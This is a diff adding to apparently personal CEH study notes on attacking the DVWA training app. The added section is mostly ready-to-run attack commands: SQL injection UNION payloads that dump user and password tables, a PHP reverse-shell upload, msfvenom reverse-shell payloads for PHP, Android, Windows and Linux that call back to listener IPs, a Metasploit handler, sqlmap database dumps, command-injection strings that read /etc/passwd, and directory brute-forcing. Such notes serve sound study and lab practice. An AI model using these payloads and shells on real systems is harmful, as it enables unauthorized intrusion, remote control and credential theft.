@@ -633,9 +633,74 @@ MD5 hash to reveal the original message. Enter the decrypted message as the answ
 You can log into the DVWA using the credentials admin/password.
 
 'or 1=1#    (in DVWA SQL injection you will get user ID)
+'UNION SELECT table_name, NULL FROM information_schema.tables
+'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'
+'UNION SELECT user, password FROM users
+'UNION SELECT user, password FROM users
+
+--------------------------------------------------------------------------
+#file upload reverse shell + cmd injection:
+
+https://www.revshells.com + https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+#DVWA already have login = admin & password= password for reverse shell and cookie
+
+upload php-reverse-shell.php (revshells.com - os -Windows - PHP Ivan Sincek) THEN Execute it via browser http://x.x.x.x/DVWA/hackable/uploads/php-reverse-shell.php or browse ../
+
+and then nc -lnvp 4444
+if you want netcat to use privileged port like 443 when not root run:
+sudo setcap 'cap_net_bind_service=+ep' $(realpath $(command -v nc))
+
+OTHERWISE:
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=172.20.0.10 lport=4444 -o shell.php
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=192.168.0.227 R> /var/www/html/share/backdoor.apk
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.164 LPORT=1234 -f exe -o blackwindow.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.31.64 LPORT=4444 -f elf -o shell.elf
+
+msfconsole
+search php reverse
+use exploit/multi/handler (shell reverse tcp)
+show options
+set lhost 172.25.0.10
+run
+
+Now upload shell.php on DVWA once uploaded go to https://192.168.0.222:8080/DVWA/hackable/uploads/ and click on the shell.php to start reverse shell
+
+OTHERWISE:
+
+sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" --dbs
+sqlmap -u http://xxxx/sql/?idxxxxxx=Submit#" --cookie="security=low; PHPSESSIONID=121121212" -D wordpress -T wp_users -dump
+
+#Command Injection website input: box to enter ip to Ping a Device on DVWA
+
+8.8.8.8;whoami
+127.0.0.1 && net user
+127.0.0.1 | systeminfo
+
+8.8.8;phpReverseShell From https://www.revshells.com then via Burpsuite:
+
+Or via Burp - Repeater - Request change below by phpReverseShellFromxxx - click send (Repeater)
+nc -lnvp 4444
+cat /etc/passwd
+uname -a
+cat /etc/release
+------------------------------------------------------------------------------------------------------------
+
+gobuster dir -u http://192.168.0.222:8080/CEH -w /usr/share/wordlist/general/big.txt
+gobuster dir -u http://192.168.0.222:8080/DVWA /usr/share/wordlist/general/big.txt
+gobuster dir -u http://192.168.0.222:8080 /usr/share/wordlist/general/big.txt
+
+*you can try other wordlist ...and check /robots.txt (some juicy stuff)
+cd /usr/share/wordlist/
+
+dirb http://192.168.0.222:8080/DVWA -f (-f only show 200 and good code and default word lit embedded usually good)
+dirb http://192.168.31.1 /usr/share/wordlists/dirb/vulns/iis.txt -f -o dirb-result.txt
 
 google: sqli cheat sheet github = https://github.com/payloadbox/sql-injection-payload-list
 
+------------------------------------------------------------------------------------------------------------
 # vulnerability Linux server port 8080 (could be Log4J / WAMP) exploit and access RootFlag.txt : 
   
 nmap -A -p 22,8080 172.30.10.0/24 --open  (last HOP = ip not first Hop 1 IP)
@@ -667,7 +732,6 @@ Ch@mp2022
 
 *Otherwise download the docker image and don't forget space . : docker build -t log4j-shell-poc .
 docker run --network host log4j-shell-poc
-
 -------------------------------------------------------------------------------------------------------
 
 -There is a machine running wamp server in the subnet. Provide the IP address of the server:
@@ -1556,6 +1620,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
